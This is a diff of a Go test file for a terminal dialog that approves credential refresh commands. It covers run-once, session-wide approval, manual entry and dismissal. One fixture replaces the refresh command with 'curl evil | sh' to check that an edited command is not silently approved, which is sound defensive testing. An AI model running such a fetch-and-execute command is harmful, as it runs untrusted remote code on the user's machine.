@@ -39,7 +39,7 @@ func sourceWithRefresh(t *testing.T) (*Model, *fakeSource) {
 func openRefresh(t *testing.T, m *Model) {
 	t.Helper()
 	send(t, m, keyPress("tab"), keyPress(credentialsKey))
-	if m.dialog == nil || m.dialog.title != "Refresh request" {
+	if m.dialog == nil || !strings.HasPrefix(m.dialog.title, "Refresh ") {
 		t.Fatalf("dialog = %s, want the refresh request", describe(m.dialog))
 	}
 }
@@ -55,20 +55,17 @@ func TestARefreshRequestShowsTheCommandBeforeItRuns(t *testing.T) {
 			t.Fatalf("dialog = %q, want it to carry %q", body, want)
 		}
 	}
-	var keys []string
-	for _, item := range m.dialog.items {
-		keys = append(keys, item.key)
+	if len(m.dialog.formActions) != 2 || m.dialog.formActions[0].key != "refresh" || m.dialog.formActions[1].key != "dismiss" {
+		t.Fatal("missing refresh decisions")
 	}
-	if !slices.Equal(keys, []string{"once", "session", "enter", "dismiss"}) {
-		t.Fatalf("answers = %v", keys)
-	}
+
 }
 
 func TestRunOnceRenewsWithTheCommandAndRemembersNothing(t *testing.T) {
 	t.Parallel()
 	m, ds := sourceWithRefresh(t)
 	openRefresh(t, m)
-	drain(t, m, m.dialog.action("once"), 0)
+	refreshAnswer(t, m, "once")
 
 	if len(ds.renewals) != 1 {
 		t.Fatalf("renewals = %#v, want one", ds.renewals)
@@ -94,7 +91,7 @@ func TestRunForTheSessionAnswersTheNextAskUnprompted(t *testing.T) {
 	t.Parallel()
 	m, ds := sourceWithRefresh(t)
 	openRefresh(t, m)
-	drain(t, m, m.dialog.action("session"), 0)
+	refreshAnswer(t, m, "session")
 
 	next := refreshRequest()
 	next.ID = "sreq_refresh_2"
@@ -116,7 +113,7 @@ func TestAnEditedCommandIsNotCoveredByTheSession(t *testing.T) {
 	t.Parallel()
 	m, ds := sourceWithRefresh(t)
 	openRefresh(t, m)
-	drain(t, m, m.dialog.action("session"), 0)
+	refreshAnswer(t, m, "session")
 
 	ds.mu.Lock()
 	ds.projectSecrets[0].RefreshCommand = []string{"sh", "-c", "curl evil | sh"}
@@ -133,12 +130,10 @@ func TestARenewalCanBeTypedIn(t *testing.T) {
 	t.Parallel()
 	m, ds := sourceWithRefresh(t)
 	openRefresh(t, m)
-	drain(t, m, m.dialog.action("enter"), 0)
-	if m.dialog == nil || m.dialog.title != "New value" {
-		t.Fatalf("dialog = %s, want the value asked for", describe(m.dialog))
-	}
-	m.dialog.input.SetValue("gho_pasted")
-	send(t, m, keyPress("enter"))
+	m.dialog.form.choose("source", "manual")
+
+	m.dialog.form.set("value", "gho_pasted")
+	answerApproval(t, m, "refresh")
 	if len(ds.renewals) != 1 || ds.renewals[0].Value != "gho_pasted" || ds.renewals[0].Command != nil {
 		t.Fatalf("renewals = %#v, want the typed value", ds.renewals)
 	}
@@ -150,7 +145,7 @@ func TestDismissingARefreshDismissesIt(t *testing.T) {
 	t.Parallel()
 	m, ds := sourceWithRefresh(t)
 	openRefresh(t, m)
-	drain(t, m, m.dialog.action("dismiss"), 0)
+	refreshAnswer(t, m, "dismiss")
 	if !slices.Equal(ds.dismissed, []string{"sreq_refresh"}) || len(ds.denials) != 0 || len(ds.renewals) != 0 {
 		t.Fatalf("dismissed = %v, denials = %v, renewals = %v", ds.dismissed, ds.denials, ds.renewals)
 	}
@@ -316,7 +311,7 @@ func TestARenewalThatLostTheRaceIsNotAFailure(t *testing.T) {
 	ds.mu.Lock()
 	ds.renewErr = ErrAlreadyAnswered
 	ds.mu.Unlock()
-	drain(t, m, m.dialog.action("session"), 0)
+	refreshAnswer(t, m, "session")
 
 	if m.dialog != nil {
 		t.Fatalf("dialog = %s, want no error for an ask somebody else answered", describe(m.dialog))
@@ -332,7 +327,7 @@ func TestARequestBeingRenewedIsNotRunAgain(t *testing.T) {
 	m, ds := sourceWithRefresh(t)
 	openRefresh(t, m)
 	m.renewing = map[string]bool{"sreq_refresh": true}
-	drain(t, m, m.dialog.action("once"), 0)
+	refreshAnswer(t, m, "once")
 	if len(ds.renewals) != 0 {
 		t.Fatalf("renewals = %#v, want none while one is out", ds.renewals)
 	}
